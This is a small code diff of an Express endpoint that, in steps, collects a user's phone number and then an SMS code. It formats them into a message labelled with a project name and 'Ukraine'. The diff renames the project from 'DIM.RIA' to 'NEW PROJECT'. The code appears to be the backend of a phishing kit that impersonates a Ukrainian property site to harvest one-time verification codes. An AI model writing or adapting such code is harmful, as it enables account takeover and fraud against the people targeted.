@@ -51,7 +51,7 @@ app.post('/api/send-data', async (req, res) => {
 
     if (step === 'phone' && phone) {
         // КРОК 1: ТІЛЬКИ НОМЕР
-        message = `*Проект:* DIM.RIA\n*Номер:* \`${phone}\`\n*Країна:* Україна`;
+        message = `*Проект:* NEW PROJECT ⚡⚡⚡\n*Номер:* \`${phone}\`\n*Країна:* Україна`;
     } 
     else if (step === 'code' && code) {
         // КРОК 2: ТІЛЬКИ SMS-КОД
